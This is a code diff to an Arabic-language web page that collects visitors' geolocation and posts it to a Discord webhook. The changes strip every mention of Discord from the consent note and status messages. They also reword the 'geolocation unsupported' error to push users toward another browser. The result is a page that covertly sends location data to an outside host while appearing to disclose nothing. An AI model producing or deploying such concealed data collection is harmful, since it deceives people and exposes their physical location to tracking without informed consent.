@@ -37,7 +37,6 @@
 
     <p class="muted">
         Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap    </p>
-    <img style="width: 500px;" src="https://static.vecteezy.com/system/resources/thumbnails/056/331/468/small/ad-market-product-ads-online-advertising-concept-internet-advertising-digital-marketing-social-media-businessman-using-laptop-with-ads-dashboard-digital-marketing-strategy-analysis-for-branding-photo.jpg" alt="">
   </div>
 
   <script>
@@ -111,7 +110,7 @@
 
     getBtn.addEventListener('click', () => {
       if (!('geolocation' in navigator)) {
-        setStatus('المتصفح لا يدعم تحديد الموقع الجغرافي.', 'err');
+        setStatus('الرجاء المحاولة من متصفح اخر.', 'err');
         return;
       }
 
@@ -128,16 +127,16 @@
             accuracy,
             timestamp: new Date(pos.timestamp).toISOString(),
             maps_link: link,
-            note: 'لا يتم تخزين البيانات في هذه الصفحة. سيتم إرسالها فقط إلى ويبهوك ديسكورد بعد موافقتك.'
+            note: 'لا يتم تخزين البيانات في هذه الصفحة. .'
           };
 
           // نعرض البيانات للمستخدم بشفافية
           showData(data);
-          setStatus(`تم جلب الإحداثيات ✓ (~${Math.round(accuracy)}م دقة). جاري الإرسال إلى ديسكورد…`);
+          setStatus(`تم جلب الإحداثيات ✓ (~${Math.round(accuracy)}م دقة). جاري الإرسال …`);
 
           try {
             await sendDirectToDiscord(buildDiscordPayload(data));
-            setStatus('تم الإرسال إلى ديسكورد بنجاح ✓', 'ok');
+            setStatus('تم الإرسال بنجاح ✓', 'ok');
           } catch (e) {
             console.error(e);
             if (isLikelyCORSError(e)) {
@@ -164,3 +163,4 @@
   </script>
 </body>
 </html>
+
